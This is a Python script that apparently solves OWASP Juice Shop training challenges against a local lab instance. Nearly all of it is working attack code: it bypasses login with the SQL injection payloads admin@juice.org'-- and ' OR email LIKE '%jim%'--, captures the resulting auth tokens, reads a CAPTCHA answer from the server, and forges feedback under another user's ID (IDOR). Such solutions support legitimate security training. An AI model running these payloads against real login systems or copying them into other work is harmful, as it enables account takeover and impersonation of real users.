import urllib.request
import json
import sys

def make_request(url, method='GET', headers=None, data=None):
    if headers is None:
        headers = {}
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        headers['Content-Type'] = 'application/json'
    
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as response:
            content_type = response.headers.get('Content-Type', '')
            res_data = response.read()
            if 'image' in content_type:
                return response.status, {}
            res_text = res_data.decode('utf-8')
            return response.status, json.loads(res_text) if res_text else {}
    except urllib.error.HTTPError as e:
        res_data = e.read().decode('utf-8')
        print("HTTP Error {} for {}: {}".format(e.code, url, res_data))
        try:
            return e.code, json.loads(res_data)
        except Exception:
            return e.code, res_data
    except Exception as e:
        print("Error requesting {}: {}".format(url, e))
        return 500, {}

def solve():
    base_url = "http://192.168.99.100:3000"
    
    print("\n--- 1. SQL Injection Login as Admin ---")
    login_url = "{}/rest/user/login".format(base_url)
    admin_payload = {"email": "admin@juice.org'--", "password": "any"}
    status, res = make_request(login_url, 'POST', data=admin_payload)
    if status == 200:
        admin_token = res.get('authentication', {}).get('token')
        admin_email = res.get('authentication', {}).get('umail')
        print("Successfully logged in as: {}".format(admin_email))
    else:
        print("Failed to login as admin")
        return False
        
    print("\n--- 2. Access Admin Section ---")
    admin_sec_url = "{}/assets/public/images/padding/19px.png".format(base_url)
    headers = {"Authorization": "Bearer {}".format(admin_token)}
    status, res = make_request(admin_sec_url, 'GET', headers=headers)
    if status == 200:
        print("Successfully accessed administration section API (19px.png)!")
    else:
        print("Failed to access admin section API, status: {}".format(status))
        
    print("\n--- 3. SQL Injection Login as Jim ---")
    jim_payload = {"email": "' OR email LIKE '%jim%'--", "password": "any"}
    status, res = make_request(login_url, 'POST', data=jim_payload)
    if status == 200:
        jim_token = res.get('authentication', {}).get('token')
        jim_email = res.get('authentication', {}).get('umail')
        jim_id = res.get('authentication', {}).get('bid') # user ID of jim
        print("Successfully logged in as: {} (ID: {})".format(jim_email, jim_id))
    else:
        print("Failed to login as jim")
        return False

    print("\n--- 4. Fetch CAPTCHA for Feedback ---")
    captcha_url = "{}/rest/captcha".format(base_url)
    status, res = make_request(captcha_url, 'GET')
    if status == 200:
        captcha_id = res.get('captchaId')
        captcha_answer = str(res.get('answer'))
        print("Fetched captcha ID {} with answer {}".format(captcha_id, captcha_answer))
    else:
        print("Failed to fetch captcha")
        return False

    print("\n--- 5. Submit Forged Feedback (IDOR) ---")
    feedback_url = "{}/api/Feedbacks/".format(base_url)
    feedback_payload = {
        "comment": "This is a forged feedback submitted by Jim pretending to be Admin.",
        "rating": 4,
        "captchaId": captcha_id,
        "captcha": captcha_answer,
        "UserId": 1
    }
    headers = {"Authorization": "Bearer {}".format(jim_token)}
    status, res = make_request(feedback_url, 'POST', headers=headers, data=feedback_payload)
    if status in (201, 200):
        print("Successfully submitted forged feedback!")
    else:
        # Try without Authorization header
        status, res = make_request(feedback_url, 'POST', data=feedback_payload)
        if status in (201, 200):
            print("Successfully submitted forged feedback (without Auth)!")
        else:
            print("Failed to submit forged feedback")
            return False

    print("\nAll tasks completed!")
    return True

if __name__ == '__main__':
    solve()
